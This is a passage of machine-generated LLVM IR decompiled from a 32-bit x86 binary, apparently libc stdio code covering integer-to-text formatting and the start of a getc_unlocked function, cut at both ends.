  %v0_8056055 = phi i32 [ %v0_8056055111, %dec_label_pc_805603a ], [ %v0_8056055111, %dec_label_pc_8056033 ], [ %v0_8056055.pre, %dec_label_pc_805603e ]
  %v1_8056055 = add i32 %v0_8056055, 1
  %v8_8056055 = icmp eq i32 %v1_8056055, 0
  store i32 %v1_8056055, i32* %ebx.global-to-local, align 4
  br i1 %v8_8056055, label %dec_label_pc_805606f, label %dec_label_pc_8056058

dec_label_pc_8056058:                             ; preds = %dec_label_pc_8056055
  %v1_805605a = sub i32 -1, %v0_8056055
  store i32 %v1_805605a, i32* %eax.global-to-local, align 4
  %v1_805605c = inttoptr i32 %v0_805605c to i32*
  store i32 176, i32* %v1_805605c, align 4
  %v0_8056062 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056062 = load i32, i32* @ecx, align 4
  %v2_8056062 = add i32 %v1_8056062, 4
  %v3_8056062 = inttoptr i32 %v2_8056062 to i32*
  store i32 %v0_8056062, i32* %v3_8056062, align 4
  %v0_8056065 = load i32, i32* @ecx, align 4
  %v1_8056065 = add i32 %v0_8056065, 8
  %v2_8056065 = inttoptr i32 %v1_8056065 to i32*
  store i32 ptrtoint (i32* @global_var_805b413.556 to i32), i32* %v2_8056065, align 4
  %v0_805606c = load i32, i32* @ecx, align 4
  %v1_805606c = add i32 %v0_805606c, 12
  store i32 %v1_805606c, i32* @ecx, align 4
  br label %dec_label_pc_805606f

dec_label_pc_805606f:                             ; preds = %dec_label_pc_8056055, %dec_label_pc_8056058
  %v0_8056073 = phi i32 [ %v0_805605c, %dec_label_pc_8056055 ], [ %v1_805606c, %dec_label_pc_8056058 ]
  %v0_805606f = load i32, i32* %edx.global-to-local, align 4
  %v1_805606f = icmp eq i32 %v0_805606f, 0
  br i1 %v1_805606f, label %dec_label_pc_8056082, label %dec_label_pc_8056073

dec_label_pc_8056073:                             ; preds = %dec_label_pc_805606f
  %v1_8056073 = inttoptr i32 %v0_8056073 to i32*
  store i32 112, i32* %v1_8056073, align 4
  %v0_8056079 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056079 = load i32, i32* @ecx, align 4
  %v2_8056079 = add i32 %v1_8056079, 4
  %v3_8056079 = inttoptr i32 %v2_8056079 to i32*
  store i32 %v0_8056079, i32* %v3_8056079, align 4
  %v0_805607c = load i32, i32* %edi.global-to-local, align 4
  %v1_805607c = load i32, i32* @ecx, align 4
  %v2_805607c = add i32 %v1_805607c, 8
  %v3_805607c = inttoptr i32 %v2_805607c to i32*
  store i32 %v0_805607c, i32* %v3_805607c, align 4
  %v0_805607f = load i32, i32* @ecx, align 4
  %v1_805607f = add i32 %v0_805607f, 12
  store i32 %v1_805607f, i32* @ecx, align 4
  br label %dec_label_pc_8056082

dec_label_pc_8056082:                             ; preds = %dec_label_pc_805606f, %dec_label_pc_8056073
  %v0_80560a0 = phi i32 [ %v0_8056073, %dec_label_pc_805606f ], [ %v1_805607f, %dec_label_pc_8056073 ]
  br i1 %v1_8055e9c, label %dec_label_pc_8056096, label %dec_label_pc_8056089

dec_label_pc_8056089:                             ; preds = %dec_label_pc_8056082
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_8056090 = load i8, i8* %v2_8056029, align 1
  %v4_8056090 = and i8 %v3_8056090, 16
  %v5_8056090 = icmp eq i8 %v4_8056090, 0
  br i1 %v5_8056090, label %dec_label_pc_80560b3, label %dec_label_pc_8056096

dec_label_pc_8056096:                             ; preds = %dec_label_pc_8056089, %dec_label_pc_8056082
  %v0_8056096 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056098 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056098 = sub i32 %v0_8056096, %v1_8056098
  store i32 %v2_8056098, i32* %eax.global-to-local, align 4
  %v1_805609a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805609a = sub i32 %v2_8056098, %v1_805609a
  %v8_805609a = xor i32 %v1_805609a, %v2_8056098
  %v9_805609a = xor i32 %v2_805609a, %v2_8056098
  %v10_805609a = and i32 %v9_805609a, %v8_805609a
  %v11_805609a = icmp slt i32 %v10_805609a, 0
  %v13_805609a = icmp slt i32 %v2_805609a, 0
  %v2_805609c = icmp eq i1 %v13_805609a, %v11_805609a
  br i1 %v2_805609c, label %dec_label_pc_80560b3, label %dec_label_pc_805609e

dec_label_pc_805609e:                             ; preds = %dec_label_pc_8056096
  %v2_805609e = sub i32 %v1_805609a, %v2_8056098
  store i32 %v2_805609e, i32* %ebp.global-to-local, align 4
  %v1_80560a0 = inttoptr i32 %v0_80560a0 to i32*
  store i32 176, i32* %v1_80560a0, align 4
  %v0_80560a6 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80560a6 = load i32, i32* @ecx, align 4
  %v2_80560a6 = add i32 %v1_80560a6, 4
  %v3_80560a6 = inttoptr i32 %v2_80560a6 to i32*
  store i32 %v0_80560a6, i32* %v3_80560a6, align 4
  %v0_80560a9 = load i32, i32* @ecx, align 4
  %v1_80560a9 = add i32 %v0_80560a9, 8
  %v2_80560a9 = inttoptr i32 %v1_80560a9 to i32*
  store i32 ptrtoint (i32* @global_var_805b413.556 to i32), i32* %v2_80560a9, align 4
  %v0_80560b0 = load i32, i32* @ecx, align 4
  %v1_80560b0 = add i32 %v0_80560b0, 12
  store i32 %v1_80560b0, i32* @ecx, align 4
  br label %dec_label_pc_80560b3

dec_label_pc_80560b3:                             ; preds = %dec_label_pc_8056096, %dec_label_pc_8056089, %dec_label_pc_805609e
  %v1_805613b121 = phi i32 [ %v0_80560a0, %dec_label_pc_8056096 ], [ %v0_80560a0, %dec_label_pc_8056089 ], [ %v1_80560b0, %dec_label_pc_805609e ]
  %v12_80560b3 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80560b3, label %dec_label_pc_805612e, label %dec_label_pc_80560ba

dec_label_pc_80560ba:                             ; preds = %dec_label_pc_80560b3
  %v5_80560ba = load i32, i32* %edx.global-to-local, align 4
  %v6_80560ba = and i32 %v5_80560ba, -256
  %v7_80560ba = or i32 %v6_80560ba, %stack_var_-42.0
  store i32 %v7_80560ba, i32* %edx.global-to-local, align 4
  %v0_80560c1 = load i32, i32* %esi.global-to-local, align 4
  %v2_80560c1 = icmp slt i32 %v0_80560c1, 0
  %v1_80560c3 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80560c1, label %dec_label_pc_80560d2, label %dec_label_pc_80560db

dec_label_pc_80560d2:                             ; preds = %dec_label_pc_80560ba
  store i32 %v0_80560c1, i32* %edx.global-to-local, align 4
  %v1_80560d4 = sub i32 0, %v0_80560c1
  br label %dec_label_pc_80560db

dec_label_pc_80560db:                             ; preds = %dec_label_pc_80560ba, %dec_label_pc_80560d2
  %storemerge27 = phi i32 [ %v1_80560d4, %dec_label_pc_80560d2 ], [ %v0_80560c1, %dec_label_pc_80560ba ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_80560d2 ], [ 43, %dec_label_pc_80560ba ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80560e3 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80560e3, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80560ef

dec_label_pc_80560ef:                             ; preds = %dec_label_pc_80560ef.backedge, %dec_label_pc_80560db
  %v0_80560fa = phi i32 [ %v0_80560fa.pre, %dec_label_pc_80560ef.backedge ], [ %v2_80560e3, %dec_label_pc_80560db ]
  %v0_80560f7 = phi i32 [ %v0_80560f7.pre, %dec_label_pc_80560ef.backedge ], [ 2, %dec_label_pc_80560db ]
  %v0_80560ef = phi i32 [ %v9_80560f8, %dec_label_pc_80560ef.backedge ], [ %storemerge27, %dec_label_pc_80560db ]
  %v1_80560f6 = ashr i32 %v0_80560ef, 31
  %v1_80560f7 = add i32 %v0_80560f7, 1
  store i32 %v1_80560f7, i32* %edi.global-to-local, align 4
  %v2_80560f8 = zext i32 %v0_80560ef to i64
  %v4_80560f8 = zext i32 %v1_80560f6 to i64
  %v5_80560f8 = mul nuw i64 %v4_80560f8, 4294967296
  %v6_80560f8 = or i64 %v5_80560f8, %v2_80560f8
  %v8_80560f8 = sdiv i64 %v6_80560f8, 10
  %v9_80560f8 = trunc i64 %v8_80560f8 to i32
  %v10_80560f8 = srem i64 %v6_80560f8, 10
  %v1_80560fa = add i32 %v0_80560fa, -1
  store i32 %v1_80560fa, i32* %ebx.global-to-local, align 4
  store i32 %v9_80560f8, i32* %esi.global-to-local, align 4
  %v3_80560fd = and i32 %v9_80560f8, -256
  %v1_80560ff = trunc i64 %v10_80560f8 to i8
  %v2_80560ff = add i8 %v1_80560ff, 48
  %v12_80560ff = zext i8 %v2_80560ff to i32
  %v15_80560ff = or i32 %v12_80560ff, %v3_80560fd
  store i32 %v15_80560ff, i32* %eax.global-to-local, align 4
  %v3_8056104 = inttoptr i32 %v1_80560fa to i8*
  store i8 %v2_80560ff, i8* %v3_8056104, align 1
  store i32 %v9_80560f8, i32* %edx.global-to-local, align 4
  %v7_8056108 = icmp sgt i32 %v1_80560f7, 3
  br i1 %v7_8056108, label %dec_label_pc_805610a, label %dec_label_pc_80560ef.backedge

dec_label_pc_805610a:                             ; preds = %dec_label_pc_80560ef
  %v2_805610a = icmp eq i32 %v9_80560f8, 0
  %v1_805610c = icmp eq i1 %v2_805610a, false
  br i1 %v1_805610c, label %dec_label_pc_80560ef.backedge, label %dec_label_pc_805610e

dec_label_pc_80560ef.backedge:                    ; preds = %dec_label_pc_805610a, %dec_label_pc_80560ef
  %v0_80560f7.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_80560fa.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80560ef

dec_label_pc_805610e:                             ; preds = %dec_label_pc_805610a
  %v4_805610e = zext i8 %storemerge9 to i32
  %v7_805610e = or i32 %v3_80560fd, %v4_805610e
  store i32 %v7_805610e, i32* %edx.global-to-local, align 4
  %v0_8056112 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056112 = add i32 %v0_8056112, -2
  store i32 %v1_8056112, i32* %eax.global-to-local, align 4
  %v3_8056115 = add i32 %v0_8056112, -1
  %v4_8056115 = inttoptr i32 %v3_8056115 to i8*
  store i8 %storemerge9, i8* %v4_8056115, align 1
  %v5_8056118 = load i32, i32* %edx.global-to-local, align 4
  %v6_8056118 = and i32 %v5_8056118, -256
  %v7_8056118 = or i32 %v6_8056118, %stack_var_-42.0
  store i32 %v7_8056118, i32* %edx.global-to-local, align 4
  %v2_805611c = load i32, i32* %ebx.global-to-local, align 4
  %v3_805611c = add i32 %v2_805611c, -2
  %v4_805611c = inttoptr i32 %v3_805611c to i8*
  store i8 %v1_80560c3, i8* %v4_805611c, align 1
  %v0_805611f = load i32, i32* @ecx, align 4
  %v1_805611f = inttoptr i32 %v0_805611f to i32*
  store i32 112, i32* %v1_805611f, align 4
  %v0_8056125 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056125 = load i32, i32* @ecx, align 4
  %v2_8056125 = add i32 %v1_8056125, 4
  %v3_8056125 = inttoptr i32 %v2_8056125 to i32*
  store i32 %v0_8056125, i32* %v3_8056125, align 4
  %v0_8056128 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056128 = load i32, i32* @ecx, align 4
  %v2_8056128 = add i32 %v1_8056128, 8
  %v3_8056128 = inttoptr i32 %v2_8056128 to i32*
  store i32 %v0_8056128, i32* %v3_8056128, align 4
  %v0_805612b = load i32, i32* @ecx, align 4
  %v1_805612b = add i32 %v0_805612b, 12
  store i32 %v1_805612b, i32* @ecx, align 4
  br label %dec_label_pc_805612e

dec_label_pc_805612e:                             ; preds = %dec_label_pc_80560b3, %dec_label_pc_8055d5d, %dec_label_pc_805610e
  %v0_80561ad = phi i32 [ %v1_805613b121, %dec_label_pc_80560b3 ], [ %v2_8055d65, %dec_label_pc_8055d5d ], [ %v1_805612b, %dec_label_pc_805610e ]
  %v2_805612e = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805612e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056132

dec_label_pc_8056132:                             ; preds = %dec_label_pc_8056132, %dec_label_pc_805612e
  %v0_8056132 = phi i32 [ %v2_805612e, %dec_label_pc_805612e ], [ %v1_8056134, %dec_label_pc_8056132 ]
  %stack_var_-216.0 = phi i32 [ %v3_8055c5f, %dec_label_pc_805612e ], [ %v5_8056137, %dec_label_pc_8056132 ]
  %v1_8056132 = inttoptr i32 %v0_8056132 to i32*
  %v2_8056132 = load i32, i32* %v1_8056132, align 4
  store i32 %v2_8056132, i32* %ebx.global-to-local, align 4
  %v1_8056134 = add i32 %v0_8056132, 12
  store i32 %v1_8056134, i32* %eax.global-to-local, align 4
  %v5_8056137 = sub i32 %stack_var_-216.0, %v2_8056132
  %v7_805613b = icmp ult i32 %v1_8056134, %v0_80561ad
  br i1 %v7_805613b, label %dec_label_pc_8056132, label %dec_label_pc_805613f

dec_label_pc_805613f:                             ; preds = %dec_label_pc_8056132
  store i32 %v0_80561ad, i32* %esi.global-to-local, align 4
  %v5_8056152 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8056162 = icmp eq i1 %v5_8056152, false
  %v2_8056162 = zext i1 %v1_8056162 to i32
  store i32 %v2_8056162, i32* %edx.global-to-local, align 4
  %v2_8056165 = sub i32 %v5_8056137, %v2_8056162
  store i32 %v2_8056165, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8056165, 1
  br i1 %tmp190, label %dec_label_pc_80561af, label %dec_label_pc_805616f

dec_label_pc_805616f:                             ; preds = %dec_label_pc_805613f
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8056176 = inttoptr i32 %v1_8055c9f to i8*
  %v3_8056176 = load i8, i8* %v2_8056176, align 1
  %v4_8056176 = and i8 %v3_8056176, 8
  %v5_8056176 = icmp eq i8 %v4_8056176, 0
  br i1 %v5_8056176, label %dec_label_pc_8056191, label %dec_label_pc_805617c

dec_label_pc_805617c:                             ; preds = %dec_label_pc_805616f
  %v1_805617c = add i32 %v0_80561ad, 12
  store i32 %v1_805617c, i32* %esi.global-to-local, align 4
  %v1_805617f = inttoptr i32 %v0_80561ad to i32*
  store i32 160, i32* %v1_805617f, align 4
  %v1_8056185 = load i32, i32* @ecx, align 4
  %v2_8056185 = add i32 %v1_8056185, 4
  %v3_8056185 = inttoptr i32 %v2_8056185 to i32*
  store i32 %v2_8056165, i32* %v3_8056185, align 4
  %v0_8056188 = load i32, i32* @ecx, align 4
  %v1_8056188 = add i32 %v0_8056188, 8
  %v2_8056188 = inttoptr i32 %v1_8056188 to i32*
  store i32 ptrtoint (i32* @global_var_805b413.556 to i32), i32* %v2_8056188, align 4
  br label %dec_label_pc_80561af

dec_label_pc_8056191:                             ; preds = %dec_label_pc_805616f
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8056198 = add i32 %tmp156, 16
  %v2_8056198 = inttoptr i32 %v1_8056198 to i32*
  %v3_8056198 = load i32, i32* %v2_8056198, align 4
  %v9_8056198 = icmp eq i32 %v3_8056198, 48
  %v1_805619c = icmp eq i1 %v9_8056198, false
  br i1 %v1_805619c, label %dec_label_pc_80561a9, label %dec_label_pc_805619e

dec_label_pc_805619e:                             ; preds = %dec_label_pc_8056191
  %v3_805619e = load i32, i32* %stack_var_-152, align 4
  %v5_805619e = add i32 %v3_805619e, %v2_8056165
  store i32 %v5_805619e, i32* %stack_var_-152, align 4
  br label %dec_label_pc_80561ad

dec_label_pc_80561a4:                             ; preds = %dec_label_pc_80561b5
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80561dc

dec_label_pc_80561a9:                             ; preds = %dec_label_pc_8056191
  br label %dec_label_pc_80561ad

dec_label_pc_80561ad:                             ; preds = %dec_label_pc_805619e, %dec_label_pc_80561a9
  store i32 %v0_80561ad, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80561af

dec_label_pc_80561af:                             ; preds = %dec_label_pc_805613f, %dec_label_pc_805617c, %dec_label_pc_80561ad
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80561b1 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_80561b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80561b5

dec_label_pc_80561b5:                             ; preds = %dec_label_pc_80561d3, %dec_label_pc_80561af
  call void @__pseudo_call(i32 %tmp156)
  %v1_80561ce = load i32, i32* %ebx.global-to-local, align 4
  %v2_80561ce = add i32 %v1_80561ce, 4
  %v3_80561ce = inttoptr i32 %v2_80561ce to i32*
  %v4_80561ce = load i32, i32* %v3_80561ce, align 4
  %v15_80561ce = icmp eq i32 %v2_8056165, %v4_80561ce
  %v1_80561d1 = icmp eq i1 %v15_80561ce, false
  br i1 %v1_80561d1, label %dec_label_pc_80561a4, label %dec_label_pc_80561d3

dec_label_pc_80561d3:                             ; preds = %dec_label_pc_80561b5
  %v1_80561d3 = add i32 %v1_80561ce, 12
  store i32 %v1_80561d3, i32* %ebx.global-to-local, align 4
  %v0_80561d6 = load i32, i32* %edi.global-to-local, align 4
  %v2_80561d6 = add i32 %v0_80561d6, %v2_8056165
  store i32 %v2_80561d6, i32* %edi.global-to-local, align 4
  %v1_80561d8 = load i32, i32* %esi.global-to-local, align 4
  %v7_80561d8 = icmp ult i32 %v1_80561d3, %v1_80561d8
  br i1 %v7_80561d8, label %dec_label_pc_80561b5, label %dec_label_pc_80561dc

dec_label_pc_80561dc:                             ; preds = %dec_label_pc_80561d3, %dec_label_pc_80561a4
  %v0_80561e2 = phi i32 [ -1, %dec_label_pc_80561a4 ], [ %v2_80561d6, %dec_label_pc_80561d3 ]
  store i32 %v0_80561e2, i32* %eax.global-to-local, align 4
  %v2_80561e5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80561e5, i32* @esi, align 4
  store i32 %v0_8055c42, i32* @edi, align 4
  store i32 %v0_8055c41, i32* @ebp, align 4
  ret i32 %v0_80561e2

; uselistorder directives
  uselistorder i32 %v0_80561e2, { 1, 0 }
  uselistorder i32 %v2_8056165, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8056162, { 1, 0 }
  uselistorder i32 %v1_8056134, { 1, 2, 0 }
  uselistorder i32 %v0_8056132, { 1, 0 }
  uselistorder i32 %v0_80561ad, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_80560f8, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80560c1, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805609a, { 1, 0 }
  uselistorder i32 %v1_805609a, { 1, 0, 2 }
  uselistorder i32 %v2_8056098, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8056055, { 1, 0 }
  uselistorder i32 %v2_8055fc2, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055fbc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8056019, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8055f58, { 1, 0 }
  uselistorder i32 %v0_8055f53, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8055f20, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8055f1b, { 1, 0 }
  uselistorder i8 %v2_8055f14, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8055f14, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8055e9e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8055e83, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8055e4e, { 1, 0 }
  uselistorder i32 %v2_8055e07, { 2, 1, 0 }
  uselistorder i32 %v0_8055ebd, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8055dd9, { 1, 0 }
  uselistorder x86_fp80 %v3_8055dbb, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8055db8, { 1, 0 }
  uselistorder x86_fp80 %v4_8055da0, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8055d9a, { 1, 2, 0 }
  uselistorder i32 %v3_8055d97, { 1, 0 }
  uselistorder i32 %v1_8055d90, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8055dc9, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8055d91, { 1, 0 }
  uselistorder i8 %v4_8055d41, { 1, 0 }
  uselistorder i3 %v1_8055cde, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8055c66, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8055c5f, { 1, 0, 2 }
  uselistorder i3 %v4_8055c58, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 11, 10, 12, 5, 8, 1, 6, 7, 3, 2, 0, 4, 9 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 4, 5, 7, 2, 3, 0, 8, 6 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 8, 9, 12, 14, 13, 15, 10, 11, 16, 19, 17, 20, 18, 21, 22, 23, 24, 25, 1, 26, 27, 28 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 4, 21, 5, 23, 24, 6, 22, 10, 19, 20, 7, 8, 11, 13, 12, 1, 14, 16, 15, 2, 18, 17, 3, 0, 9 }
  uselistorder i32 13, { 1, 6, 5, 2, 3, 4, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_80561af, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80561ad, { 1, 0 }
  uselistorder label %dec_label_pc_805612e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80560db, { 1, 0 }
  uselistorder label %dec_label_pc_80560b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056082, { 1, 0 }
  uselistorder label %dec_label_pc_805606f, { 1, 0 }
  uselistorder label %dec_label_pc_8056055, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056022, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805600d, { 1, 0 }
  uselistorder label %dec_label_pc_8056002, { 1, 0 }
  uselistorder label %dec_label_pc_8055f89, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055f7b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055f41, { 1, 0 }
  uselistorder label %dec_label_pc_8055f11.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8055edd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055eac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055e97, { 1, 0 }
  uselistorder label %dec_label_pc_8055e03, { 1, 0 }
  uselistorder label %dec_label_pc_8055ddb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055dd9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8055d5d, { 1, 0 }
  uselistorder label %dec_label_pc_8055c86, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_80561ec = load i32, i32* @ebx, align 4
  %v4_80561f0 = ptrtoint i16* %tmp to i32
  store i32 %v4_80561f0, i32* @ebx, align 4
  %v1_80561f4 = add i32 %v4_80561f0, 16
  %v2_80561f4 = inttoptr i32 %v1_80561f4 to i32*
  %v3_80561f4 = load i32, i32* %v2_80561f4, align 4
  %v2_80561f7 = add i32 %v4_80561f0, 24
  %v3_80561f7 = inttoptr i32 %v2_80561f7 to i32*
  %v4_80561f7 = load i32, i32* %v3_80561f7, align 4
  %v10_80561f7 = icmp ult i32 %v3_80561f4, %v4_80561f7
  br i1 %v10_80561f7, label %dec_label_pc_8056299, label %dec_label_pc_8056200

dec_label_pc_8056200:                             ; preds = %entry
  %v2_8056200 = load i16, i16* %tmp, align 2
  %v3_8056200 = zext i16 %v2_8056200 to i32
  %v1_8056203 = and i32 %v3_8056200, 131
  %v6_805620d = icmp ugt i32 %v1_8056203, 128
  br i1 %v6_805620d, label %dec_label_pc_8056227, label %dec_label_pc_805620f

dec_label_pc_805620f:                             ; preds = %dec_label_pc_8056200
  %v0_805620f = load i32, i32* @edx, align 4
  %v6_8056217 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_805620f, i32 %v0_805620f)
  %v1_805621f = icmp eq i32 %v6_8056217, 0
  %v1_8056221 = icmp eq i1 %v1_805621f, false
  br i1 %v1_8056221, label %dec_label_pc_80562be, label %dec_label_pc_805620f.dec_label_pc_8056227_crit_edge

dec_label_pc_805620f.dec_label_pc_8056227_crit_edge: ; preds = %dec_label_pc_805620f
  %v0_8056227.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056227

dec_label_pc_8056227:                             ; preds = %dec_label_pc_805620f.dec_label_pc_8056227_crit_edge, %dec_label_pc_8056200
  %v2_805625b = phi i32 [ %v0_8056227.pre, %dec_label_pc_805620f.dec_label_pc_8056227_crit_edge ], [ %v4_80561f0, %dec_label_pc_8056200 ]
  %v1_8056227 = inttoptr i32 %v2_805625b to i16*
  %v2_8056227 = load i16, i16* %v1_8056227, align 2
  %v3_8056227 = zext i16 %v2_8056227 to i32
  store i32 %v3_8056227, i32* @ecx, align 4
  %v2_805622a = and i16 %v2_8056227, 2
  %v3_805622a = icmp eq i16 %v2_805622a, 0
  br i1 %v3_805622a, label %dec_label_pc_805624a, label %dec_label_pc_805622f

dec_label_pc_805622f:                             ; preds = %dec_label_pc_8056227
  %tmp20 = urem i16 %v2_8056227, 2
  %v1_8056231 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8056231
  %v2_8056234 = and i32 %tmp19, 4
  %v3_8056234 = add i32 %v2_805625b, 36
  %v4_8056234 = add i32 %v3_8056234, %v2_8056234
  %v5_8056234 = inttoptr i32 %v4_8056234 to i8*
  %v6_8056234 = load i8, i8* %v5_8056234, align 1
  %v7_8056234 = zext i8 %v6_8056234 to i32
  %v8_8056234 = load i32, i32* @edx, align 4
  %v9_8056234 = and i32 %v8_8056234, -256
  %v10_8056234 = or i32 %v9_8056234, %v7_8056234
  store i32 %v10_8056234, i32* %edx.global-to-local, align 4
  %v1_8056238 = add i16 %v2_8056227, -1
  store i16 %v1_8056238, i16* %v1_8056227, align 2
  %v0_805623e = load i32, i32* @ebx, align 4
  %v1_805623e = add i32 %v0_805623e, 40
  %v2_805623e = inttoptr i32 %v1_805623e to i32*
  store i32 0, i32* %v2_805623e, align 4
  %v0_8056245 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056245 = urem i32 %v0_8056245, 256
  store i32 %v1_8056245, i32* @edx, align 4
  br label %dec_label_pc_80562c1

dec_label_pc_805624a:                             ; preds = %dec_label_pc_8056227
  %v1_805624a = add i32 %v2_805625b, 16
  %v2_805624a = inttoptr i32 %v1_805624a to i32*
  %v3_805624a = load i32, i32* %v2_805624a, align 4
  store i32 %v3_805624a, i32* @eax, align 4
  %v1_805624d = add i32 %v2_805625b, 20
